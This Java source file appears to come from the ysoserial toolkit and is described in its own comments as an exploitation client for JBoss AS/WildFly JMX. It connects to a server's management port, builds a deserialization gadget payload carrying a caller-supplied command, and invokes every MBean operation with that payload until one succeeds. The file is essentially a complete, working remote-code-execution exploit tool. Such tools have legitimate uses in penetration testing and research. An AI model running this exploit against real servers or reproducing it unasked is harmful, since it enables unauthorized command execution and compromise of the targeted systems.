/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 31.01.2016 by mbechler
 */
package ysoserial;


import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.SocketAddress;
import java.net.URI;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

import javax.management.InstanceNotFoundException;
import javax.management.IntrospectionException;
import javax.management.MBeanInfo;
import javax.management.MBeanOperationInfo;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ReflectionException;
import javax.management.remote.JMXServiceURL;
import javax.security.auth.callback.Callback;
import javax.security.auth.callback.CallbackHandler;
import javax.security.auth.callback.NameCallback;
import javax.security.auth.callback.PasswordCallback;
import javax.security.auth.callback.UnsupportedCallbackException;
import javax.security.sasl.RealmCallback;

import org.jboss.remoting3.Channel;
import org.jboss.remoting3.Connection;
import org.jboss.remoting3.Endpoint;
import org.jboss.remoting3.OpenListener;
import org.jboss.remoting3.Remoting;
import org.jboss.remoting3.remote.HttpUpgradeConnectionProviderFactory;
import org.jboss.remoting3.spi.ConnectionHandler;
import org.jboss.remoting3.spi.ConnectionHandlerContext;
import org.jboss.remoting3.spi.ConnectionHandlerFactory;
import org.jboss.remoting3.spi.ConnectionProvider;
import org.jboss.remoting3.spi.ConnectionProviderContext;
import org.jboss.remoting3.spi.RegisteredService;
import org.jboss.remotingjmx.VersionedConnection;
import org.xnio.FutureResult;
import org.xnio.IoFuture;
import org.xnio.IoFuture.Status;
import org.xnio.OptionMap;
import org.xnio.Options;
import org.xnio.Xnio;
import org.xnio.XnioWorker;
import org.xnio.ssl.JsseXnioSsl;
import org.xnio.ssl.XnioSsl;

import ysoserial.payloads.ObjectPayload;


/**
 * 
 * An exploitation client for JBoss AS/Wildfly JMX
 * 
 * This is not as easily exploitable as in other pieces of software:
 * 1. they only allow authenticated access by default
 * 2. they have a very strict module architecture:
 * 
 * - all MBeans exported by default use classloaders that expose almost nothing useful
 * - the module classloaders do not even expose the full boot classpath, so we cannot readily use stuff like
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 * 
 * 
 * 
 * 
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "nls", "javadoc", "rawtypes"
} )
public class JBoss {

    public static void main ( String[] args ) {

        URI u = URI.create(args[ 0 ]);

        final Class<? extends ObjectPayload> payloadClass = Jenkins.getPayloadClass(args[ 1 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 1 ] + "'");
            System.exit(-1);
            return;
        }

        final Object payloadObject;
        try {
            final ObjectPayload payload = payloadClass.newInstance();
            payloadObject = payload.getObject(args[ 2 ]);
        }
        catch ( Exception e ) {
            System.err.println("Failed to construct payload");
            e.printStackTrace(System.err);
            System.exit(-1);
            return;
        }

        String username = null;
        String password = null;
        if ( u.getUserInfo() != null ) {
            int sep = u.getUserInfo().indexOf(':');
            if ( sep >= 0 ) {
                username = u.getUserInfo().substring(0, sep);
                password = u.getUserInfo().substring(sep + 1);
            }
            else {
                System.err.println("Need <user>:<password>@");
                System.exit(-1);
            }
        }

        ConnectionProvider instance = null;
        ConnectionProviderContextImpl context = null;
        ConnectionHandler ch = null;
        Channel c = null;
        VersionedConnection vc = null;
        try {
            Logger logger = LogManager.getLogManager().getLogger("");
            logger.addHandler(new ConsoleLogHandler());
            logger.setLevel(Level.INFO);
            OptionMap options = OptionMap.builder().set(Options.SSL_ENABLED, u.getScheme().equals("https")).getMap();
            context = new ConnectionProviderContextImpl(options, "endpoint");
            instance = new HttpUpgradeConnectionProviderFactory().createInstance(context, options);
            String host = u.getHost();
            int port = u.getPort() > 0 ? u.getPort() : 9990;
            SocketAddress destination = new InetSocketAddress(host, port);
            ConnectionHandlerFactory chf = getConnection(destination, username, password, context, instance, options);
            ch = chf.createInstance(new ConnectionHandlerContextImpl(context));
            c = getChannel(context, ch, options);
            System.err.println("Connected");
            vc = makeVersionedConnection(c);
            MBeanServerConnection mbc = vc.getMBeanServerConnection(null);
            doExploit(payloadObject, mbc);
            System.err.println("DONE");
        }
        catch ( Throwable e ) {
            e.printStackTrace(System.err);
        }
        finally {
            cleanup(instance, context, ch, c, vc);
        }

    }


    /**
     * @param instance
     * @param context
     * @param ch
     * @param c
     * @param vc
     */
    private static void cleanup ( ConnectionProvider instance, ConnectionProviderContextImpl context, ConnectionHandler ch, Channel c,
            VersionedConnection vc ) {
        if ( vc != null ) {
            vc.close();
        }

        if ( c != null ) {
            try {
                c.close();
            }
            catch ( IOException e ) {
                e.printStackTrace(System.err);
            }
        }

        if ( ch != null ) {
            try {
                ch.close();
            }
            catch ( IOException e ) {
                e.printStackTrace(System.err);
            }
        }
        if ( instance != null ) {
            try {
                instance.close();
            }
            catch ( IOException e ) {
                e.printStackTrace(System.err);
            }
        }

        if ( context != null ) {
            context.getXnioWorker().shutdown();
        }
    }


    /**
     * @param destination
     * @param username
     * @param password
     * @param context
     * @param instance
     * @param options
     * @param xnioSsl
     * @return
     * @throws IOException
     * @throws InterruptedException
     * @throws NoSuchAlgorithmException
     * @throws NoSuchProviderException
     * @throws KeyManagementException
     */
    private static ConnectionHandlerFactory getConnection ( SocketAddress destination, final String username, final String password,
            ConnectionProviderContextImpl context, ConnectionProvider instance, OptionMap options )
                    throws IOException, InterruptedException, KeyManagementException, NoSuchProviderException, NoSuchAlgorithmException {
        XnioSsl xnioSsl = new JsseXnioSsl(context.getXnio(), options);
        FutureResult<ConnectionHandlerFactory> result = new FutureResult<ConnectionHandlerFactory>();
        instance.connect(null, destination, options, result, new CallbackHandler() {

            public void handle ( Callback[] callbacks ) throws IOException, UnsupportedCallbackException {

                for ( Callback cb : callbacks ) {

                    if ( cb instanceof NameCallback ) {
                        ( (NameCallback) cb ).setName(username);
                    }
                    else if ( cb instanceof PasswordCallback ) {
                        ( (PasswordCallback) cb ).setPassword(password != null ? password.toCharArray() : new char[0]);
                    }
                    else if ( cb instanceof RealmCallback ) {
                        // ignore
                    }
                    else {
                        System.err.println(cb);
                        throw new UnsupportedCallbackException(cb);
                    }
                }
            }
        }, xnioSsl);

        System.err.println("waiting for connection");
        IoFuture<ConnectionHandlerFactory> ioFuture = result.getIoFuture();
        Status s = ioFuture.await(5, TimeUnit.SECONDS);
        if ( s == Status.FAILED ) {
            System.err.println("Cannot connect");
            if ( ioFuture.getException() != null ) {
                ioFuture.getException().printStackTrace(System.err);
            }
        }
        else if ( s != Status.DONE ) {
            ioFuture.cancel();
            System.err.println("Connect timeout");
            System.exit(-1);
        }

        ConnectionHandlerFactory chf = ioFuture.getInterruptibly();
        return chf;
    }


    /**
     * @param context
     * @param ch
     * @param options
     * @return
     * @throws IOException
     */
    private static Channel getChannel ( ConnectionProviderContextImpl context, ConnectionHandler ch, OptionMap options ) throws IOException {
        Channel c;
        FutureResult<Channel> chResult = new FutureResult<Channel>(context.getExecutor());
        ch.open("jmx", chResult, options);

        IoFuture<Channel> cFuture = chResult.getIoFuture();
        Status s2 = cFuture.await();
        if ( s2 == Status.FAILED ) {
            System.err.println("Cannot connect");
            if ( cFuture.getException() != null ) {
                cFuture.getException().printStackTrace(System.err);
                System.exit(-1);
            }
        }
        else if ( s2 != Status.DONE ) {
            cFuture.cancel();
            System.err.println("Connect timeout");
            System.exit(-1);
        }

        c = cFuture.get();
        return c;
    }


    /**
     * @param c
     * @return
     * @throws ClassNotFoundException
     * @throws NoSuchMethodException
     * @throws IllegalAccessException
     * @throws InvocationTargetException
     * @throws MalformedURLException
     */
    private static VersionedConnection makeVersionedConnection ( Channel c )
            throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, MalformedURLException {
        VersionedConnection vc;
        Class<?> vcf = Class.forName("org.jboss.remotingjmx.VersionedConectionFactory");
        Method vcCreate = vcf.getDeclaredMethod("createVersionedConnection", Channel.class, Map.class, JMXServiceURL.class);
        vcCreate.setAccessible(true);
        vc = (VersionedConnection) vcCreate.invoke(null, c, new HashMap(), new JMXServiceURL("service:jmx:remoting-jmx://"));
        return vc;
    }


    /**
     * @param payloadObject
     * @param mbc
     * @throws IOException
     * @throws InstanceNotFoundException
     * @throws IntrospectionException
     * @throws ReflectionException
     */
    private static void doExploit ( final Object payloadObject, MBeanServerConnection mbc )
            throws IOException, InstanceNotFoundException, IntrospectionException, ReflectionException {
        Object[] params = new Object[1];
        params[ 0 ] = payloadObject;
        System.err.println("Querying MBeans");
        Set<ObjectInstance> testMBeans = mbc.queryMBeans(null, null);
        System.err.println("Found " + testMBeans.size() + " MBeans");
        for ( ObjectInstance oi : testMBeans ) {
            MBeanInfo mBeanInfo = mbc.getMBeanInfo(oi.getObjectName());
            for ( MBeanOperationInfo opInfo : mBeanInfo.getOperations() ) {
                try {
                    mbc.invoke(oi.getObjectName(), opInfo.getName(), params, new String[] {});
                    System.err.println(oi.getObjectName() + ":" + opInfo.getName() + " -> SUCCESS");
                    return;
                }
                catch ( Throwable e ) {
                    String msg = e.getMessage();
                    if ( msg.startsWith("java.lang.ClassNotFoundException:") ) {
                        int start = msg.indexOf('"');
                        int stop = msg.indexOf('"', start + 1);
                        String module = ( start >= 0 && stop > 0 ) ? msg.substring(start + 1, stop) : "<unknown>";
                        if ( !"<unknown>".equals(module) && !"org.jboss.as.jmx:main".equals(module) ) {
                            int cstart = msg.indexOf(':');
                            int cend = msg.indexOf(' ', cstart + 2);
                            String cls = msg.substring(cstart + 2, cend);
                            System.err.println(oi.getObjectName() + ":" + opInfo.getName() + " -> FAIL CNFE " + cls + " (" + module + ")");
                        }
                    }
                    else {
                        System.err.println(oi.getObjectName() + ":" + opInfo.getName() + " -> SUCCESS|ERROR " + msg);
                        return;
                    }
                }
            }
        }
    }

    /**
     * @author mbechler
     *
     */
    private static final class ConsoleLogHandler extends Handler {

        /**
         * 
         */
        public ConsoleLogHandler () {}


        @Override
        public void publish ( LogRecord record ) {
            System.err.println(record.getMessage());
        }


        @Override
        public void flush () {

        }


        @Override
        public void close () throws SecurityException {}
    }

    /**
     * @author mbechler
     *
     */
    private static final class ConnectionHandlerContextImpl implements ConnectionHandlerContext {

        private ConnectionProviderContextImpl context;


        /**
         * @param context
         */
        public ConnectionHandlerContextImpl ( ConnectionProviderContextImpl context ) {
            this.context = context;
        }


        public void remoteClosed () {}


        public OpenListener getServiceOpenListener ( String serviceType ) {
            return null;
        }


        public RegisteredService getRegisteredService ( String serviceType ) {
            return null;
        }


        public ConnectionProviderContext getConnectionProviderContext () {
            return this.context;
        }


        public Connection getConnection () {
            return null;
        }
    }

    /**
     * @author mbechler
     *
     */
    private static final class ConnectionProviderContextImpl implements ConnectionProviderContext {

        private XnioWorker worker;
        private ExecutorService executor;
        private Xnio instance;
        private Endpoint endpoint;


        /**
         * @param endpointName
         * @throws IOException
         * @throws IllegalArgumentException
         * 
         */
        public ConnectionProviderContextImpl ( OptionMap opts, String endpointName ) throws IllegalArgumentException, IOException {
            this.instance = Xnio.getInstance();

            this.worker = this.instance.createWorker(opts);
            this.endpoint = Remoting.createEndpoint(endpointName, this.worker, opts);
            this.executor = Executors.newCachedThreadPool(new ThreadFactory() {

                public Thread newThread ( Runnable r ) {
                    Thread t = new Thread(r, "Worker");
                    t.setDaemon(true);
                    return t;
                }
            });
        }


        public XnioWorker getXnioWorker () {
            return this.worker;
        }


        public Xnio getXnio () {
            return this.instance;
        }


        public Executor getExecutor () {
            return this.executor;
        }


        public Endpoint getEndpoint () {
            return this.endpoint;
        }


        public void accept ( ConnectionHandlerFactory connectionHandlerFactory ) {
            System.err.println("accept");
        }

    }


    @SuppressWarnings ( "unchecked" )
    public static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
        try {
            return (Class<? extends ObjectPayload>) Class.forName(className);
        }
        catch ( Exception e1 ) {}
        try {
            return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
        }
        catch ( Exception e2 ) {}
        return null;
    }
}
